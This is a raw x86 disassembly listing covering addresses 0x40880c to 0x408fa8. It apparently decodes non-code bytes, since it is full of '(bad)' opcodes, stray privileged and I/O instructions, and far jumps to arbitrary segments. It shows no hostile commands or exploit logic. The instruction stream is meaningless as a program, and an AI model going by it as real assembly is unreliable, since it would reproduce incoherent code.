  40880c:	ins    DWORD PTR es:[edi],dx
  40880d:	outs   dx,BYTE PTR ds:[esi]
  40880e:	popa   
  40880f:	sub    bh,BYTE PTR [esi+edi*4+0x34]
  408813:	ret    
  408814:	or     DWORD PTR ds:0x6637a84a,ebp
  40881a:	mov    bh,0x8b
  40881c:	push   ss
  40881d:	mov    edx,0x734dc24a
  408822:	inc    edi
  408823:	lock cli 
  408825:	int3   
  408826:	cwde   
  408827:	inc    esi
  408828:	push   ebp
  408829:	mov    gs,WORD PTR [eax-0x28144a0d]
  40882f:	sbb    DWORD PTR [ebp+0x74],ecx
  408832:	popa   
  408833:	(bad)  
  408835:	adc    ah,BYTE PTR [edx+0x6630d255]
  40883b:	repz inc edi
  40883d:	gs in  eax,dx
  40883f:	(bad)
  408842:	jmp    0x4407:0xa7971025
  408849:	icebp  
  40884a:	push   0x62
  40884c:	inc    esi
  40884d:	scas   al,BYTE PTR es:[edi]
  40884e:	les    esp,FWORD PTR [esi+eiz*2+0x2a]
  408852:	pop    esi
  408853:	cmp    esi,DWORD PTR [esi-0x33a1a25e]
  408859:	sbb    al,0x71
  40885b:	hlt    
  40885c:	sbb    ah,BYTE PTR [ecx]
  40885e:	dec    ebp
  40885f:	(bad)  
  408860:	idiv   BYTE PTR [edi]
  408862:	or     cl,BYTE PTR [ebx]
  408864:	xor    ebp,0xe44d1335
  40886a:	loope  0x40886a
  40886c:	sub    cl,bh
  40886e:	xor    dl,BYTE PTR [eax-0x6b]
  408871:	xlat   BYTE PTR ds:[ebx]
  408872:	push   ecx
  408873:	xchg   ebx,eax
  408874:	and    ecx,0x98fd4b57
  40887a:	xchg   esp,eax
  40887b:	ror    BYTE PTR [ecx],1
  40887d:	outs   dx,DWORD PTR ds:[esi]
  40887e:	cdq    
  40887f:	mov    esi,0x66655c7
  408884:	jmp    DWORD PTR [esi+0xd4e5638]
  40888a:	cmp    al,0x15
  40888c:	int    0x89
  40888e:	adc    BYTE PTR [esi+0x123d9e42],ch
  408894:	pop    ds
  408895:	call   0xa7b8:0x63b34d4f
  40889c:	hlt    
  40889d:	dec    ebp
  40889e:	enter  0x2bc3,0x8d
  4088a2:	fdivr  QWORD PTR [edi]
  4088a4:	pop    ebx
  4088a5:	pusha  
  4088a6:	stc    
  4088a7:	adc    bh,BYTE PTR [ebx]
  4088a9:	cmp    eax,0xc1c936a
  4088ae:	lds    ebp,FWORD PTR [edx+ebp*2]
  4088b1:	ins    DWORD PTR es:[edi],dx
  4088b2:	mov    eax,0xa9ce21a4
  4088b7:	(bad)  
  4088b8:	into   
  4088b9:	and    dl,0x32
  4088bc:	pop    edi
  4088bd:	xchg   edx,eax
  4088be:	xchg   ebx,eax
  4088bf:	mov    dh,BYTE PTR ds:0xd749720f
  4088c5:	fimul  WORD PTR [esi]
  4088c7:	push   es
  4088c8:	xchg   ebp,eax
  4088c9:	popf   
  4088ca:	cli    
  4088cb:	rol    DWORD PTR [ebx-0x2a],0xd
  4088cf:	dec    ebp
  4088d0:	sti    
  4088d1:	(bad)  
  4088d2:	fidivr WORD PTR [esi]
  4088d4:	xchg   edi,eax
  4088d5:	sub    eax,0x9ea53864
  4088da:	(bad)  
  4088db:	jnp    0x408959
  4088dd:	leave  
  4088de:	clc    
  4088df:	xlat   BYTE PTR ds:[ebx]
  4088e0:	pop    eax
  4088e1:	sub    BYTE PTR [esi+0x4e3aa0ca],dl
  4088e7:	retf   
  4088e8:	fld    QWORD PTR [di]
  4088eb:	fidiv  DWORD PTR [edi+0x1]
  4088ee:	ins    DWORD PTR es:[edi],dx
  4088ef:	sbb    DWORD PTR [ebx],0xffffffb2
  4088f2:	push   ss
  4088f3:	pcmpeqb mm3,mm4
  4088f6:	sbb    eax,0xd5d562bd
  4088fb:	jge    0x4088eb
  4088fd:	jl     0x408923
  4088ff:	jmp    0x40895c
  408901:	and    BYTE PTR [esi-0x78],0xd4
  408905:	adc    bl,BYTE PTR [ecx-0xa]
  408908:	mov    eax,ds:0x5ea7a9d
  40890d:	jp     0x40898e
  40890f:	mov    DWORD PTR [edi],ebp
  408911:	retf   0x1a03
  408914:	add    BYTE PTR [edi+0x53],dl
  408917:	in     eax,0x49
  408919:	sar    BYTE PTR [eax-0x53],0xe3
  40891d:	sbb    ch,dl
  40891f:	push   ebp
  408920:	es pop ebx
  408922:	pop    edi
  408923:	lods   eax,DWORD PTR ds:[esi]
  408924:	loop   0x408908
  408926:	pop    ss
  408927:	ja     0x40891b
  408929:	push   es
  40892a:	jmp    0xdb8eb6b4
  40892f:	mov    esp,0xb7a2fdce
  408934:	jno    0x408917
  408936:	test   BYTE PTR [edi+0xe7e667f],cl
  40893c:	sbb    eax,0xfeb8ab16
  408941:	and    cl,al
  408943:	fs mov eax,0x53c6c188
  408949:	push   es
  40894a:	xchg   ecx,eax
  40894b:	cmp    al,0x16
  40894d:	xchg   DWORD PTR [edx+ebx*8],ecx
  408950:	inc    edx
  408951:	popf   
  408952:	or     al,0x70
  408954:	push   ss
  408955:	pop    ebp
  408956:	stos   DWORD PTR es:[edi],eax
  408957:	pop    ecx
  408958:	pop    esp
  408959:	(bad)  
  40895a:	rcl    BYTE PTR [ebp-0x7a],0xf8
  40895e:	xor    eax,0x7d2be56
  408963:	aad    0x4f
  408965:	(bad)  
  408966:	rcr    DWORD PTR [ebx-0x4d],1
  408969:	outs   dx,DWORD PTR ds:[esi]
  40896a:	mov    ecx,0xd7f0ce1b
  40896f:	sar    DWORD PTR [esi],0x90
  408972:	sub    DWORD PTR [edx-0x49ff48e7],0x36
  408979:	add    esi,DWORD PTR [eax-0x79e03978]
  40897f:	out    dx,al
  408980:	retf   
  408981:	add    al,0x3f
  408983:	vpunpckhdq ymm5,ymm1,ymm5
  408987:	jmp    0x40899a
  408989:	test   DWORD PTR [ebp+esi*8+0x31],ebp
  40898d:	cmp    BYTE PTR ds:0x5511bc0d,bl
  408993:	or     edx,edx
  408995:	enter  0x763a,0xa7
  408999:	fidiv  WORD PTR [ebp+0x3285febc]
  40899f:	sbb    BYTE PTR [ebp+0x4a],al
  4089a2:	dec    ecx
  4089a3:	push   edx
  4089a4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4089a5:	pop    esp
  4089a6:	imul   ebp,DWORD PTR [eax],0x53
  4089a9:	jl     0x408990
  4089ab:	push   edx
  4089ac:	fbstp  TBYTE PTR [edi-0x52]
  4089af:	sahf   
  4089b0:	add    DWORD PTR [esi-0x3d15c338],esi
  4089b6:	or     edi,DWORD PTR [eax-0x55]
  4089b9:	test   DWORD PTR [eax-0x6d6d15ba],ecx
  4089bf:	mov    ?,WORD PTR ds:0x51e628e9
  4089c5:	out    dx,al
  4089c6:	stos   DWORD PTR es:[edi],eax
  4089c7:	aaa    
  4089c8:	mov    ebx,0x383a0448
  4089cd:	push   ds
  4089ce:	popa   
  4089cf:	(bad)  
  4089d0:	mov    dl,BYTE PTR [ecx]
  4089d2:	sub    eax,0x2dc90d8a
  4089d7:	jo     0x4089de
  4089d9:	sub    BYTE PTR [edi-0x78f23712],dl
  4089df:	cmp    DWORD PTR [ecx-0x11],esp
  4089e2:	retf   
  4089e3:	in     eax,0x57
  4089e5:	add    BYTE PTR [ecx],dl
  4089e7:	xchg   edi,eax
  4089e8:	loop   0x4089f0
  4089ea:	ins    BYTE PTR es:[edi],dx
  4089eb:	mov    bh,0xc2
  4089ed:	clc    
  4089ee:	jmp    0xd5bc:0x8bc6ff1b
  4089f5:	bnd jg 0x408a59
  4089f8:	adc    eax,0x1783c94a
  4089fd:	pop    ds
  4089fe:	mov    ebp,0x481fa988
  408a03:	sub    esi,DWORD PTR [ecx]
  408a05:	je     0x408a0f
  408a07:	scas   eax,DWORD PTR es:[edi]
  408a08:	addr16 repz enter 0xdb53,0x4f
  408a0e:	std    
  408a0f:	imul   esp,DWORD PTR fs:[edx-0x35a230ff],0x1dd30e0c
  408a1a:	fnstcw WORD PTR [ebp-0x458f9ec6]
  408a20:	cmp    eax,0x7e4a52c3
  408a25:	dec    edx
  408a26:	cs std 
  408a28:	(bad)  [edx]
  408a2a:	or     BYTE PTR [esp+esi*2-0x63],0xd9
  408a2f:	pop    es
  408a30:	dec    eax
  408a31:	popa   
  408a32:	(bad)  
  408a33:	sbb    edi,DWORD PTR [ebx]
  408a35:	popa   
  408a36:	shl    BYTE PTR [edx+0x22],cl
  408a39:	dec    esi
  408a3a:	call   0x52f4ea2e
  408a3f:	fcom   QWORD PTR [edi*1-0x7d20f1e4]
  408a46:	aaa    
  408a47:	mov    ebp,ss
  408a49:	push   ss
  408a4a:	xchg   ecx,eax
  408a4b:	repnz imul esi,edx,0x410ad968
  408a52:	push   edx
  408a53:	dec    ebx
  408a54:	xchg   edx,eax
  408a55:	callw  0xef3a
  408a59:	(bad)  
  408a5a:	jns    0x408ab3
  408a5c:	and    DWORD PTR [esi+edx*2+0x245fbc6c],ebp
  408a63:	or     al,0xfa
  408a65:	clc    
  408a66:	aam    0xbc
  408a68:	int    0x5d
  408a6a:	add    ah,BYTE PTR [ecx]
  408a6c:	icebp  
  408a6d:	dec    esi
  408a6e:	adc    DWORD PTR [ebx-0x1b7ebb6a],esp
  408a74:	add    edx,DWORD PTR [esi]
  408a76:	xchg   ebp,eax
  408a77:	sahf   
  408a78:	adc    esi,DWORD PTR [edx]
  408a7a:	and    eax,0xf377d8ca
  408a7f:	jmp    0xea31:0x497cfd3d
  408a86:	and    eax,0xa59c4415
  408a8b:	ins    BYTE PTR es:[edi],dx
  408a8c:	jge    0x408a6b
  408a8e:	imul   BYTE PTR [edx-0x64]
  408a91:	mov    edx,0xa5b11b88
  408a96:	push   ecx
  408a97:	mov    al,0x62
  408a99:	ror    DWORD PTR [edx-0x1f617667],1
  408a9f:	cld    
  408aa0:	cmp    ch,ah
  408aa2:	sbb    eax,0xe39967c5
  408aa7:	xchg   esp,eax
  408aa8:	adc    BYTE PTR [ecx],0x70
  408aab:	mov    ebp,0xa3d1a88c
  408ab0:	imul   ebx,DWORD PTR [ebx-0x6a232c64],0x66
  408ab7:	stc    
  408ab8:	pop    ds
  408ab9:	inc    edx
  408aba:	(bad)  [esi+edx*1+0x397a5e35]
  408ac1:	pushf  
  408ac2:	xor    cl,ch
  408ac4:	mov    edx,0x95c3bc57
  408ac9:	arpl   si,di
  408acb:	jns    0x408ac0
  408acd:	inc    edi
  408ace:	nop
  408acf:	lods   eax,DWORD PTR ds:[esi]
  408ad0:	or     bh,al
  408ad2:	call   0x786884ee
  408ad7:	pop    esi
  408ad8:	nop
  408ad9:	push   edi
  408ada:	inc    edi
  408adb:	aaa    
  408adc:	add    eax,0x80ff9d65
  408ae1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408ae2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408ae3:	pop    ecx
  408ae4:	es stc 
  408ae6:	(bad)  
  408ae7:	mov    cl,0x46
  408ae9:	addr16 pop esp
  408aeb:	hlt    
  408aec:	clc    
  408aed:	add    edi,DWORD PTR [edi+edx*1-0x3e95d451]
  408af4:	mov    esp,0x33aa7031
  408af9:	push   ebx
  408afa:	cmp    ebp,DWORD PTR [ebp-0x467683a1]
  408b00:	cmp    eax,DWORD PTR [ecx+0x1b72c04d]
  408b06:	test   al,0x5d
  408b08:	out    dx,al
  408b09:	dec    ebp
  408b0a:	jge    0x16de265d
  408b10:	enter  0xde32,0x9c
  408b14:	jge    0x408b31
  408b16:	das    
  408b17:	cwde   
  408b18:	shl    BYTE PTR [ebx+0x27bdbc9],cl
  408b1e:	out    0x1e,al
  408b20:	(bad)  
  408b21:	cld    
  408b22:	adc    bh,0x48
  408b25:	stc    
  408b26:	(bad)  
  408b27:	mov    ecx,0x617de174
  408b2c:	mov    esp,0x55722bea
  408b31:	lods   al,BYTE PTR ds:[esi]
  408b32:	jg     0x408b0c
  408b34:	add    al,0xdc
  408b36:	xlat   BYTE PTR ds:[ebx]
  408b37:	and    dh,BYTE PTR [eax-0x2d3992bb]
  408b3d:	loopne 0x408b83
  408b3f:	fimul  DWORD PTR ds:0x56183f71
  408b45:	adc    al,0x6a
  408b47:	xor    esi,ecx
  408b49:	xchg   BYTE PTR [ebx-0x64],dl
  408b4c:	fsqrt  
  408b4e:	mov    edx,0x78ae6924
  408b53:	clc    
  408b54:	dec    ecx
  408b55:	pop    es
  408b56:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408b57:	jns    0x408b60
  408b59:	outs   dx,BYTE PTR ds:[esi]
  408b5a:	repnz mov al,0xb8
  408b5d:	xchg   edi,eax
  408b5e:	dec    edx
  408b5f:	jp     0x408b81
  408b61:	pusha  
  408b62:	xchg   edi,eax
  408b63:	loopne 0x408b62
  408b65:	pop    esp
  408b66:	bound  ebx,QWORD PTR [edx]
  408b68:	fstp   DWORD PTR [ecx-0x4b6c06a1]
  408b6e:	dec    eax
  408b6f:	lea    ebx,ds:0x12974a35
  408b75:	xor    ebp,DWORD PTR [eax]
  408b77:	rol    BYTE PTR [edx+0x6510b789],cl
  408b7d:	imul   ch
  408b7f:	rcl    bh,1
  408b81:	cwde   
  408b82:	xchg   esi,eax
  408b83:	jae    0x408bd8
  408b85:	inc    edi
  408b86:	mov    dh,0x8d
  408b88:	pop    ds
  408b89:	test   BYTE PTR [esi],dh
  408b8b:	adc    ecx,ecx
  408b8d:	adc    DWORD PTR [eax-0x2],edi
  408b90:	fwait
  408b91:	jne    0x408b4f
  408b93:	adc    bl,BYTE PTR [edi-0x66]
  408b96:	jnp    0x408b28
  408b98:	push   ecx
  408b99:	mov    bh,0xb6
  408b9b:	imul   ebx
  408b9d:	sub    esp,DWORD PTR [ecx-0x1e]
  408ba0:	jle    0x408b75
  408ba2:	dec    ebp
  408ba3:	sub    cl,BYTE PTR [esi-0x3c]
  408ba6:	scas   eax,DWORD PTR es:[edi]
  408ba7:	ins    DWORD PTR es:[edi],dx
  408ba8:	cmp    BYTE PTR [edi],ah
  408baa:	je     0x408b81
  408bac:	lods   al,BYTE PTR ds:[esi]
  408bad:	fidivr DWORD PTR ds:0x14837971
  408bb3:	daa    
  408bb4:	leave  
  408bb5:	mov    ds:0xf7ed8686,eax
  408bba:	inc    edi
  408bbb:	loopne 0x408b71
  408bbd:	sbb    eax,0xbc732ef3
  408bc2:	sub    esp,DWORD PTR [ecx]
  408bc4:	aam    0x0
  408bc6:	ss pop eax
  408bc8:	clc    
  408bc9:	int    0x1a
  408bcb:	(bad)  
  408bcc:	in     al,dx
  408bcd:	mov    al,0x7c
  408bcf:	add    ecx,DWORD PTR [edx]
  408bd1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408bd2:	mov    al,ds:0xdaa1ca2f
  408bd7:	inc    edx
  408bd8:	mov    ah,0xd4
  408bda:	and    al,0x98
  408bdc:	xor    al,0xbc
  408bde:	sub    DWORD PTR [ebx],ecx
  408be0:	idiv   bl
  408be2:	fadd   QWORD PTR [ecx]
  408be4:	pop    ds
  408be5:	xlat   BYTE PTR ds:[ebx]
  408be6:	mov    bh,0xeb
  408be8:	cld    
  408be9:	(bad)  
  408beb:	push   ecx
  408bed:	out    dx,al
  408bee:	das    
  408bef:	cmp    eax,0xca385469
  408bf4:	aas    
  408bf5:	cwde   
  408bf6:	push   0xfffffffb
  408bf8:	in     al,dx
  408bf9:	pop    esp
  408bfa:	jne    0x408bec
  408bfc:	jmp    0x1434fb96
  408c01:	pop    es
  408c02:	push   esi
  408c03:	push   ds
  408c04:	js     0x408bdc
  408c06:	dec    esp
  408c07:	lods   al,BYTE PTR ds:[esi]
  408c08:	aas    
  408c09:	mov    ebx,0xaf3afc24
  408c0e:	fiadd  DWORD PTR [ebx+0x7d]
  408c11:	jmp    0x8e48:0x7d095b66
  408c18:	mov    eax,0x91749955
  408c1d:	push   edi
  408c1e:	addr16 mov esi,0x4c588854
  408c24:	dec    edi
  408c25:	gs push 0x57
  408c28:	das    
  408c29:	test   DWORD PTR [ecx],ebx
  408c2b:	pop    ebp
  408c2c:	mov    ds:0xbd46139a,eax
  408c31:	es addr16 jnp 0x408c84
  408c35:	jle    0x408bda
  408c37:	jb     0x408c14
  408c39:	pop    esi
  408c3a:	in     al,dx
  408c3b:	xor    eax,0x9947a27e
  408c40:	loope  0x408c6c
  408c42:	inc    edi
  408c43:	push   0x8f1bb363
  408c48:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408c49:	in     al,0x78
  408c4b:	and    ebx,edx
  408c4d:	lds    esi,FWORD PTR [edi-0x67]
  408c50:	jae    0x408cab
  408c52:	imul   ebp,DWORD PTR [eax],0xab87c2d3
  408c58:	lods   al,BYTE PTR ds:[esi]
  408c59:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408c5a:	enter  0xa0c5,0x31
  408c5e:	imul   ebx,edi,0x2c
  408c61:	mov    ebp,0x3af0045
  408c66:	inc    eax
  408c67:	(bad)  
  408c68:	stc    
  408c69:	pop    esi
  408c6a:	jmp    0x408c7a
  408c6c:	pop    edi
  408c6d:	mov    DWORD PTR [eax],eax
  408c6f:	mov    al,ds:0xf664aff3
  408c74:	fmul   st,st(4)
  408c76:	and    BYTE PTR [eax+edi*4],cl
  408c79:	cmp    eax,0x5ee898de
  408c7e:	gs fwait
  408c80:	in     al,dx
  408c81:	dec    ebx
  408c82:	leave  
  408c83:	inc    di
  408c85:	jg     0x408c72
  408c87:	mov    dh,0x93
  408c89:	aaa    
  408c8a:	xchg   esp,eax
  408c8b:	mov    dh,0xb0
  408c8d:	jl     0x408c74
  408c8f:	mov    bl,0xe
  408c91:	xor    eax,0x5728e4a5
  408c96:	aaa    
  408c97:	add    BYTE PTR [ebx],dh
  408c99:	js     0x408c27
  408c9b:	mov    ch,BYTE PTR [edx+0x6588f786]
  408ca1:	push   edi
  408ca2:	test   edx,0x21cb1e9e
  408ca8:	cmp    eax,0xf5f7282b
  408cad:	or     BYTE PTR [ebp-0x4bd4b96b],ah
  408cb3:	xchg   ecx,eax
  408cb4:	and    dl,ah
  408cb6:	mov    al,ds:0x623168ab
  408cbb:	push   esp
  408cbc:	lock xor BYTE PTR [ebp+0x1c],0x7e
  408cc1:	bound  ecx,QWORD PTR [esi+0x1a062a4a]
  408cc7:	adc    eax,0x4bbe9bae
  408ccc:	add    cl,cl
  408cce:	cmp    DWORD PTR [ebx],edx
  408cd0:	ss pop ds
  408cd2:	bound  esp,QWORD PTR [edx+0x40]
  408cd5:	adc    al,bl
  408cd7:	or     DWORD PTR [ebx],0xffffffa8
  408cda:	add    edi,esi
  408cdc:	mov    edx,0xff0d196d
  408ce1:	add    al,0x1
  408ce3:	in     al,dx
  408ce4:	push   ecx
  408ce5:	cmp    DWORD PTR [eax+0x2d],esi
  408ce8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408ce9:	jmp    0xe1225925
  408cee:	imul   ecx,DWORD PTR [ecx+0x550e6eaf],0xfffffffb
  408cf5:	pusha  
  408cf6:	cmp    edi,ecx
  408cf8:	scas   eax,DWORD PTR es:[edi]
  408cf9:	fbld   TBYTE PTR [eax+ebp*2-0x16da192e]
  408d00:	mov    DWORD PTR [ecx-0x6b],ecx
  408d03:	sbb    esp,DWORD PTR [ebp+0x395872e6]
  408d09:	fisubr DWORD PTR [ebx-0x41e8d007]
  408d0f:	lods   al,BYTE PTR ds:[esi]
  408d10:	mov    edi,0xfd45c938
  408d15:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408d16:	or     eax,ecx
  408d18:	aad    0xd4
  408d1a:	jp     0x408d80
  408d1c:	push   edi
  408d1d:	pusha  
  408d1e:	outs   dx,DWORD PTR ds:[esi]
  408d1f:	mov    ds:0x1329b34a,al
  408d24:	(bad)  
  408d25:	or     DWORD PTR [ecx+esi*2+0x56df681a],ecx
  408d2c:	int    0xb5
  408d2e:	push   0xffffffeb
  408d30:	xchg   ebx,eax
  408d31:	fmul   DWORD PTR [edi+0x8]
  408d34:	lea    esi,[eax-0x61]
  408d37:	inc    esp
  408d38:	out    dx,al
  408d39:	es out dx,al
  408d3b:	dec    ecx
  408d3c:	or     ecx,DWORD PTR [esi+0x6c]
  408d3f:	rol    BYTE PTR [ecx-0x4f],cl
  408d42:	jl     0x408d8d
  408d44:	push   eax
  408d45:	pop    ebx
  408d46:	fcmovnbe st,st(2)
  408d48:	clc    
  408d49:	mov    eax,ds:0x132f4c42
  408d4e:	xor    BYTE PTR [esi-0x3df6a9e8],0x1
  408d55:	add    al,0x6f
  408d57:	cli    
  408d58:	fcomp  st(6)
  408d5a:	pop    ebx
  408d5b:	ss int 0x74
  408d5e:	ror    edx,cl
  408d60:	push   esp
  408d61:	out    0x16,al
  408d63:	add    esi,DWORD PTR [eax-0x31961f14]
  408d69:	pop    esi
  408d6a:	loop   0x408d1e
  408d6c:	dec    edi
  408d6d:	fs das 
  408d6f:	xor    DWORD PTR [edx],edi
  408d71:	adc    esi,DWORD PTR [eax+ecx*2]
  408d74:	mov    ebp,?
  408d76:	push   edx
  408d77:	mov    edx,0xb75be9ae
  408d7c:	idiv   DWORD PTR [edi-0x2a27bf8b]
  408d82:	pop    es
  408d83:	sahf   
  408d84:	jecxz  0x408dda
  408d86:	mov    cs,WORD PTR [ebx]
  408d88:	push   es
  408d89:	out    0xf6,ax
  408d8c:	cmp    DWORD PTR [eax],eax
  408d8e:	data16 mov ch,0xe9
  408d91:	aad    0xb8
  408d93:	hlt    
  408d94:	xchg   ebx,eax
  408d95:	stos   BYTE PTR es:[edi],al
  408d96:	add    bh,BYTE PTR [ebx+0x70fdc0a5]
  408d9c:	mov    ah,0xae
  408d9e:	pop    esi
  408d9f:	enter  0xe31,0x7e
  408da3:	loope  0x408d2a
  408da5:	ret    
  408da6:	sub    BYTE PTR [ebx+0x2d],al
  408da9:	(bad)  
  408dab:	(bad)  
  408dac:	cld    
  408dad:	pop    ds
  408dae:	push   esp
  408daf:	cmp    DWORD PTR [ebp+eiz*2+0x35e83ed8],esp
  408db6:	add    edi,DWORD PTR [ebp+0x51]
  408db9:	cmc    
  408dba:	mov    bh,0xaa
  408dbc:	cmp    BYTE PTR [ecx],0x8d
  408dbf:	mov    bh,BYTE PTR [eax+0x53]
  408dc2:	arpl   bp,cx
  408dc4:	mov    cl,0xf7
  408dc6:	loope  0x408db4
  408dc8:	sbb    BYTE PTR [esi+0x27],ch
  408dcb:	rol    BYTE PTR [ebp+0x8dc61ba],cl
  408dd1:	or     al,0xcd
  408dd3:	mov    ch,0xd2
  408dd5:	sub    BYTE PTR ds:[ebp+0x507fd028],cl
  408ddc:	enter  0xe394,0x86
  408de0:	or     BYTE PTR [ebx-0x13],0xd1
  408de4:	inc    edi
  408de5:	pop    edx
  408de6:	jb     0x408df5
  408de8:	fwait
  408de9:	shr    BYTE PTR [eax+0x3bc34a74],0x9a
  408df0:	sbb    cl,BYTE PTR [edx-0x2d561c1e]
  408df6:	mov    ch,0xd0
  408df8:	leave  
  408df9:	imul   DWORD PTR [ecx+ebp*2]
  408dfc:	xchg   edx,eax
  408dfd:	cmc    
  408dfe:	adc    BYTE PTR [edx+0x17],dh
  408e01:	jae    0x408e47
  408e03:	std    
  408e04:	xlat   BYTE PTR ds:[ebx]
  408e05:	sbb    BYTE PTR [ecx+0x49],0xc5
  408e09:	push   es
  408e0a:	stc    
  408e0b:	fst    QWORD PTR [edx+0x78]
  408e0e:	add    esi,DWORD PTR [esi+0x42]
  408e11:	push   esi
  408e12:	dec    ecx
  408e13:	(bad)  
  408e14:	nop
  408e15:	lods   al,BYTE PTR ds:[esi]
  408e16:	xor    ah,BYTE PTR [esi+0x41]
  408e19:	pop    edi
  408e1a:	mov    eax,0x6bca74fe
  408e1f:	js     0x408dd1
  408e21:	adc    eax,0xcd0af344
  408e26:	or     ah,BYTE PTR [edx]
  408e28:	and    ah,ch
  408e2a:	adc    ax,0x1e52
  408e2e:	push   cs
  408e2f:	mov    esp,0x74a3d739
  408e34:	add    al,0xe0
  408e36:	and    BYTE PTR [edi-0x7e17d41c],bh
  408e3c:	inc    esp
  408e3d:	data16 adc BYTE PTR [ebx],ch
  408e40:	call   0x7767:0xaf223c2a
  408e47:	mov    cl,0x2b
  408e49:	xor    esi,DWORD PTR [esi]
  408e4b:	add    ah,0x87
  408e4e:	adc    al,0xbf
  408e50:	(bad)  
  408e52:	out    dx,eax
  408e53:	mov    ah,0x1c
  408e55:	sahf   
  408e56:	inc    ebx
  408e57:	jo     0x408e8d
  408e59:	or     cl,BYTE PTR [di-0xd]
  408e5d:	mov    bh,0x2b
  408e5f:	cmp    DWORD PTR [ebp+0x2d],edx
  408e62:	inc    esp
  408e63:	(bad)  
  408e64:	bound  ecx,QWORD PTR [esi+edi*1+0x41]
  408e68:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408e69:	jp     0x408ed6
  408e6b:	into   
  408e6c:	mov    eax,gs:0xae6416ee
  408e72:	in     eax,0x18
  408e74:	pop    es
  408e75:	ss xchg ebp,eax
  408e77:	fiadd  DWORD PTR [edi+edi*2+0x11c7b118]
  408e7e:	(bad)  
  408e7f:	cld    
  408e80:	aaa    
  408e81:	arpl   WORD PTR [ebp+0x437b95af],dx
  408e87:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408e88:	jne    0x408e55
  408e8a:	shr    DWORD PTR [eax+0x33],cl
  408e8d:	push   es
  408e8e:	mov    dl,0x61
  408e90:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408e91:	std    
  408e92:	stc    
  408e93:	int    0xe5
  408e95:	out    0xe1,eax
  408e97:	push   eax
  408e98:	int3   
  408e99:	push   ebp
  408e9a:	test   al,0xcd
  408e9c:	dec    ecx
  408e9d:	test   BYTE PTR [ebp+eiz*8-0x79],bh
  408ea1:	aas    
  408ea2:	dec    edx
  408ea3:	push   edx
  408ea4:	cmp    eax,0xe7d905d
  408ea9:	sub    BYTE PTR [eax-0x6a],ch
  408eac:	mov    bh,0xd
  408eae:	loopne 0x408e68
  408eb0:	imul   ecx,esi,0x48
  408eb3:	mov    esi,0x873a3cfd
  408eb8:	test   al,0x87
  408eba:	add    esp,0xbbe39f48
  408ec0:	js     0x408eba
  408ec2:	popa   
  408ec3:	xchg   esp,eax
  408ec4:	mov    ecx,0x2c0ca5dc
  408ec9:	in     al,dx
  408eca:	comiss xmm6,DWORD PTR [ebp-0x13977bca]
  408ed1:	fnstenv [ebx-0x27]
  408ed4:	inc    ebp
  408ed5:	test   eax,0xeb86a993
  408eda:	xchg   esi,eax
  408edb:	loop   0x408f32
  408edd:	(bad)  
  408ede:	(bad)  
  408edf:	add    BYTE PTR [eax+0x3f],ah
  408ee2:	jp     0x408e89
  408ee4:	dec    edi
  408ee5:	push   0xffffffd1
  408ee7:	and    esi,DWORD PTR ss:[eax+edi*4-0x30]
  408eec:	add    ah,BYTE PTR [eax+esi*1+0x4e]
  408ef0:	cs ins BYTE PTR es:[edi],dx
  408ef2:	lods   eax,DWORD PTR ds:[esi]
  408ef3:	or     edi,DWORD PTR [eax]
  408ef5:	aaa    
  408ef6:	pop    esi
  408ef7:	fdiv   st,st(2)
  408ef9:	and    edi,edx
  408efb:	or     eax,0x7fa59c63
  408f00:	cli    
  408f01:	xchg   al,bl
  408f03:	cld    
  408f04:	and    BYTE PTR [edx+0x24],ch
  408f07:	or     eax,0x512f7b9
  408f0c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408f0d:	pop    ebx
  408f0e:	loop   0x408eaf
  408f10:	or     edi,DWORD PTR [edx+0x79b5e135]
  408f16:	pop    es
  408f17:	setbe  BYTE PTR [eax]
  408f1a:	sub    DWORD PTR [esi+0x76],edi
  408f1d:	repnz mov edx,0x2161d89
  408f23:	ins    BYTE PTR es:[edi],dx
  408f24:	mov    dl,0xb1
  408f26:	sbb    cl,0xf8
  408f29:	xor    eax,0xf1b78ce0
  408f2e:	mov    cl,0xf3
  408f30:	lds    ebp,FWORD PTR [ecx+0x3f12fde3]
  408f36:	xor    BYTE PTR [edi],bh
  408f38:	xchg   esi,eax
  408f39:	push   ds
  408f3a:	fisttp QWORD PTR [esi]
  408f3c:	int    0xe7
  408f3e:	xchg   esi,eax
  408f3f:	pop    ebx
  408f40:	test   eax,0xd5fecd05
  408f45:	inc    edx
  408f46:	dec    ecx
  408f47:	sbb    ch,BYTE PTR [ecx+edi*8+0x414ff516]
  408f4e:	mov    bh,0xc4
  408f50:	aas    
  408f51:	sub    al,0x6d
  408f53:	adc    DWORD PTR [ebx+0x3b],edx
  408f56:	pop    ds
  408f57:	fld    st(1)
  408f59:	cmp    eax,0x98ca2090
  408f5e:	sub    eax,0xc76be53b
  408f63:	out    0xe8,eax
  408f65:	(bad)  
  408f66:	stos   BYTE PTR es:[edi],al
  408f67:	push   0x23
  408f69:	into   
  408f6a:	push   cs
  408f6b:	outs   dx,BYTE PTR ds:[esi]
  408f6c:	sub    DWORD PTR [eax+0x9fb09eb],0xa4d7d583
  408f76:	loop   0x408fab
  408f78:	push   esi
  408f79:	test   eax,0x1f1606c4
  408f7e:	mov    ebx,0xbd03989f
  408f83:	inc    ecx
  408f84:	push   ecx
  408f85:	push   edi
  408f86:	int3   
  408f87:	sub    cl,al
  408f89:	aam    0x89
  408f8b:	and    DWORD PTR [ecx-0x2259b9ff],ebx
  408f91:	imul   eax,ecx,0xffffffc8
  408f94:	adc    ch,BYTE PTR [esi-0x34]
  408f97:	jle    0x408f36
  408f99:	arpl   WORD PTR [ebx-0x6b],bp
  408f9c:	add    al,BYTE PTR [edx-0x613cb379]
  408fa2:	stos   DWORD PTR es:[edi],eax
  408fa3:	add    eax,0x2bb6a642
  408fa8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
